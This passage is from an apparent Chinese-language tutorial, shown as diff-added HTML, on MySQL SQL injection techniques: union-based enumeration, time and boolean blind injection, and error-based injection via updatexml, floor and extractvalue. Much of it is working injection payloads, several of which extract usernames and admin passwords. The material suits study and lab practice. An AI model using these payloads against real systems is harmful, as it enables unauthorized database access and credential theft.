+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">//</span><span class="w"> </span><span class="err">库名</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">schema_name</span><span class="p">),</span><span class="mi">3</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">3</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">表名</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">),</span><span class="mi">3</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">列名</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">),</span><span class="mi">3</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;emails&#39;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">数据</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="n">email_id</span><span class="p">),</span><span class="mi">3</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">security</span><span class="p">.</span><span class="n">emails</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="5-时间型盲注--布尔型盲注">5 时间型盲注 &amp; 布尔型盲注</h2>
+<p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。</p>
+<blockquote>
+<p><strong>时间型</strong>：通过注入特定语句，根据页面请求的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点。</p>
+<p><strong>布尔型</strong>：页面只返回 True 和 False 两种状态(类型)页面。利用页面返回不同，逐个猜解数据。</p>
+</blockquote>
+<p>适用场景：通常无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知。</p>
+<h3 id="51-原理示意">5.1 原理示意</h3>
+<p><code>select * from user where id = '?'</code></p>
+<p><code>?</code> 为用户输入，替代为：<code>4' and sleep(3)#</code></p>
+<p>实际执行的 SQL 语句：<code>select * from user where id = '4' and sleep(3)#</code></p>
+<p>当 ID = 4 存在时，sleep 3 秒</p>
+<p>当 ID = 4 不存在时，直接返回</p>
+<p>整条拼接出来的 SQL 是正确的就执行 sleep，前面错误（不存在），sleep(3) 不执行</p>
+<h3 id="52-常用函数">5.2 常用函数</h3>
+<h4 id="521-编码转换函数">5.2.1 编码转换函数</h4>
+<p><code>ord('a')</code>：将字符转化为 ascii 码</p>
+<p><code>ascii('a')</code>：将字符转化为 ascii 码</p>
+<p><code>char(97)</code>：将 ascii 转化为字符</p>
+<h4 id="522-条件判断函数">5.2.2 条件判断函数</h4>
+<p><code>if(exp1, exp2, exp3)</code>：exp1 成立，执行 exp2，否则执行 exp3。</p>
+<p>case when then 函数：<code>select case when username=&quot;admin&quot; then sleep(1) else &quot;error&quot; end from wp_user_</code></p>
+<h4 id="523-截取函数">5.2.3 截取函数</h4>
+<p><strong>substr 函数</strong></p>
+<p><code>substr(str, pos, len)</code>：从 pos 位置开始，截取字符串 str 的 len 长度</p>
+<p><code>substr(str from pos for length)</code> ：可以用在过滤了 <code>,</code> 的情况</p>
+<p><strong>substring 函数</strong></p>
+<p><code>substring(str, pos, len)</code>：从 pos 位置开始，截取字符串 str 的 len 长度</p>
+<p><code>substring(str from pos for length)</code> ：可以用在过滤了 <code>,</code> 的情况</p>
+<p>注意：pos 从 1 开始</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">116</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>mid 函数</strong></p>
+<p><code>mid(str, pos, length)</code></p>
+<p><code>mid(str from pos for length)</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>left 函数</strong></p>
+<p>从左开始截取字符串</p>
+<p><code>left(str, len)</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>right 函数</strong></p>
+<p>从右开始截取字符串</p>
+<p><code>right(str, len)</code></p>
+<p><strong>利用正则表达式逐位匹配</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">rlike</span><span class="w"> </span><span class="s2">&#34;^1&#34;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">REGEXP</span><span class="w"> </span><span class="s2">&#34;^1&#34;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">REGEXP</span><span class="w"> </span><span class="s2">&#34;^12&#34;</span><span class="w">
+</span><span class="w"></span><span class="p">...</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="524-延时函数">5.2.4 延时函数</h4>
+<p><code>sleep(n)</code>：程序挂起 n 秒</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="o">=</span><span class="mi">97</span><span class="p">,</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><code>benchmark(count, sha(1))</code>：执行 sha(1) 函数 count 次达到延时的目的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="w"> </span><span class="n">BENCHMARK</span><span class="p">(</span><span class="mi">10000000</span><span class="p">,</span><span class="w"> </span><span class="n">sha</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>利用笛卡尔积制造延时：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">C</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>利用正则表达式匹配长字符串制造延时：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">IF</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="n">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">))</span><span class="w"> </span><span class="n">RLIKE</span><span class="w"> </span><span class="s1">&#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="525-其它函数">5.2.5 其它函数</h4>
+<p><code>count()</code>：计算总数</p>
+<p><code>length()</code>：返回字符串的长度</p>
+<h2 id="6-报错型注入">6 报错型注入</h2>
+<h3 id="61-原理">6.1 原理</h3>
+<blockquote>
+<p>用于使用 SQL 语句报错的语法，用于注入结果无回显，但显示错误信息有输出的情况</p>
+<p>返回的信息即是攻击者需要的信息</p>
+</blockquote>
+<p>MySQL 报错注入主要分为以下几类：</p>
+<ol>
+<li>BigInt 等数据类型溢出</li>
+<li>Xpath 语法错误</li>
+<li>count() + rand() + group by 导致主键重复</li>
+<li>空间数据类型函数错误</li>
+</ol>
+<h3 id="62-常用函数">6.2 常用函数</h3>
+<h4 id="621-updatexml">6.2.1 updatexml</h4>
+<blockquote>
+<p>updatexml 第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。</p>
+<p>报错长度最大为 32 位</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">//</span><span class="w"> </span><span class="err">显示当前数据库</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">显示所有数据库</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="n">x</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">获取表名</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s2">&#34;sectest&#34;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="n">x</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">make_set</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s1">&#39;~&#39;</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">())),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">获取列名</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s2">&#34;wp_user_&#34;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">make_set</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s1">&#39;~&#39;</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s2">&#34;users&#34;</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">获取数据</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">make_set</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s1">&#39;~&#39;</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span><span class="o">#</span><span class="w">
+</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="622-floor-显错注入">6.2.2 floor 显错注入</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="w"> </span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="w"> </span><span class="n">concat</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="623-其它显错注入">6.2.3 其它显错注入</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">())))</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="mi">1105</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~sectest&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">.</span><span class="mi">000000</span><span class="n">s</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">))</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">mysql5</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">NAME_CONST</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">),</span><span class="n">NAME_CONST</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">))</span><span class="n">a</span><span class="p">;</span><span class="w">
